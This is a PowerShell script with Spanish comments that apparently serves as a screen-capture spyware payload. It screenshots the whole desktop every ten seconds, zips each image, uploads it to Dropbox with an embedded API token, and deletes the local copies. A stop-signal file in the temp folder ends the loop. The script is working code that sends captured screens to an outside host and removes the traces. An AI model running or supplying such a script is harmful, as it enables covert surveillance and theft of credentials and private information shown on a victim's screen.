Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Drawing;

public class DPI {
  [DllImport("gdi32.dll")]
  static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

  public enum DeviceCap {
  VERTRES = 10,
  DESKTOPVERTRES = 117
  }

  public static float scaling() {
  Graphics g = Graphics.FromHwnd(IntPtr.Zero);
  IntPtr desktop = g.GetHdc();
  int LogicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
  int PhysicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);

  return (float)PhysicalScreenHeight / (float)LogicalScreenHeight;
  }
}
'@ -ReferencedAssemblies 'System.Drawing.dll' -ErrorAction Stop

# Define la API Token de Dropbox (Aquí debes agregar tu token)
$db = ""

# Archivo de señal para detener el script
$stopSignalFile = "$env:TEMP\stop.txt"

# Función para subir archivos a Dropbox
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Carga ensamblados necesarios solo una vez al inicio
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# Bucle principal para la captura de pantallas
while ($true) {
    # Verificar si existe el archivo de señalización para detener el script
    if (Test-Path $stopSignalFile) {
        Write-Host "Archivo de señalización detectado. Deteniendo el script."
        Remove-Item $stopSignalFile -Force
        exit
    }

    # Obtener información de la pantalla virtual
    $s = [System.Windows.Forms.SystemInformation]::VirtualScreen

    # Crear un bitmap del tamaño de la pantalla virtual
    $b = New-Object System.Drawing.Bitmap ([int32]([math]::round($($s.Width * [DPI]::scaling()), 0))),([int32]([math]::round($($s.Height * [DPI]::scaling()), 0)));
    [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Left, $s.Top, 0, 0, $b.Size)

    # Crear un directorio temporal para almacenar el archivo
    $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
    $userDir = "$env:USERPROFILE\Documents\Screenshots_$folderDateTime"
    New-Item -Path $userDir -ItemType Directory

    # Guardar el bitmap en PNG
    $fileName = "$env:COMPUTERNAME-$(Get-Date -Format HHmmss).png"
    $filePath = "$userDir\$fileName"
    $b.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)

    # Comprimir el archivo PNG
    Compress-Archive -Path $filePath -DestinationPath "$userDir.zip"
    $zipFile = "$userDir.zip"

    # Subir a Dropbox
    if (-not ([string]::IsNullOrEmpty($db))) {
        DropBox-Upload -SourceFilePath $zipFile
    }

    # Limpieza
    Remove-Item -Path $userDir -Recurse
    Remove-Item -Path $zipFile

    # Esperar 10 segundos antes de la siguiente iteración
    Start-Sleep -Seconds 10
}
